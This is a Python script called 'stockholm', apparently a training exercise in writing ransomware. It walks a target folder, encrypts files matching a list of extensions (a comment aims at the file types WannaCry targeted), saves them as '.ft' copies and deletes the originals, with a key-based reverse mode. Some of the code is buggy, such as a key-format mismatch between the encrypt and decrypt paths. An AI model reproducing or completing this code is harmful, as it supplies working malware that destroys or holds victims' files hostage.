#!/usr/bin/env python3

# TODO: The key is generated or given as arguments to encrypt, of course for decrypt the key is needed.
# TODO: encrypt
# TODO: decrypt
# TODO: Target all the file targeted by wannacry

import argparse
import os
from typing import Any
from pathlib import Path
import secrets

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

VERSION = 1.0
TARGET_FOLDER = "/home/tfrily/goinfre/LivreIT"
# TARGET_FOLDER = Path.home().as_posix() + "/infection" 

def get_extentions(path_to_file: str) -> dict:
    d = {}
    with open(path_to_file) as f:
        for line in f:
            d[line.rstrip().split('.')[1]] = line.rstrip()
    return d

def create_key() -> bytes:
        key = secrets.token_bytes(32)
        return key

def encrypt_data(key: bytes, plaintext: bytes) -> bytes:
    # Generate a random initialization vector
    iv = secrets.token_bytes(16)
    
    # Create a Cipher object
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Encrypt the plaintext
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    
    # Return the IV and ciphertext as a base64 encoded string
    return base64.b64encode(iv + ciphertext)

def decrypt_data(key: bytes, encrypted_data: bytes) -> bytes:
    # Decode the base64 encoded data
    encrypted_data_bytes = base64.b64decode(encrypted_data)
    
    # Extract the IV and ciphertext
    iv = encrypted_data_bytes[:16]
    ciphertext = encrypted_data_bytes[16:]
    
    # Create a Cipher object
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    
    # Decrypt the ciphertext
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
    
    return decrypted_data

def get_content_file(path_to_file: str) -> bytes:
    content = None
    with open(path_to_file, 'rb') as file:
        content = file.read()
        file.close()
    return content

def write_content_file(path_to_file: str, content: Any):
    with open(path_to_file, 'wb') as file:
        content = file.write(content)
        file.close()

def remove_file(path_to_file: str):
    os.remove(path_to_file)

def encrypt_file(path_to_file: str, new_file: str, key: bytes):
        with open(path_to_file,'rb') as r_file:
            with open(new_file, 'wb') as w_file:
                for line in r_file:
                    w_file.write(encrypt_data(key, line))
                w_file.close()
        r_file.close()


def decrypt_file(file_to_decrypt: str, new_file:str ,key: bytes):
        with open(file_to_decrypt,'rb') as r_file:
            with open(new_file, 'wb') as w_file:
                for line in r_file:
                    w_file.write(decrypt_data(key, line))
                w_file.close()
        r_file.close()

def stockholm(key: bytes, s: bool):
    extentions = get_extentions("extensions.txt")
    # files = get_files(infection_dir)
    for root, subdirs, files in os.walk(TARGET_FOLDER):
            for file in files:
                try:
                    if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
                        print(f"File TO Encrypt {file}")
                        # print(f"FILE {os.path.join(root,file)}")
                        encrypt_file(os.path.join(root, file), os.path.join(root, file + ".ft"), key)
                        # write_content_file(os.path.join(root, file + ".ft"), )
                        remove_file(os.path.join(root, file))
                    if s is True:
                        print(f"Encrypted file {file}")
                except Exception as e:
                    print(f"Failed for {e}")
                    continue

def reverse_stockholm(key: bytes):
    for root, subdirs, files in os.walk(TARGET_FOLDER):
            for file in files:
                try:
                    if file.split('.')[-1] == "ft":
                        file_path, ext = os.path.splitext(os.path.join(root, file))
                        decrypt_file(os.path.join(root, file),file_path ,key)
                        # write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
                        remove_file(os.path.join(root, file))
                except Exception as e:
                    print(f"Failed for {e}")
                    continue

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-r", "--reverse", type=str, help="reverse the encryption")
    group.add_argument("-k", "--key", type=str, nargs="?", help="use this key for encryption")
    group.add_argument("-v", "--version", action="store_true", help="Show the version of stockholm")
    parser.add_argument("-s", "--silent", action="store_true", help="silence the output")
    args = parser.parse_args()
    try:
        key = None
        if args.version:
            print(f"stockholm version {VERSION}")
            exit(1)
        if args.key is not None:
            key = args.key
        if args.reverse is None:
            if key is None:
                key = create_key()
                print(f"The key {key.hex()}")
            if not args.silent:
                stockholm(key, True)
            else:
                stockholm(key, False)

        if args.reverse is not None:
            reverse_stockholm(bytes(args.reverse, 'utf-8'))
        exit(1)
    except Exception as e:
        print(f"Failed for {e}")


if __name__ == "__main__":
    main()
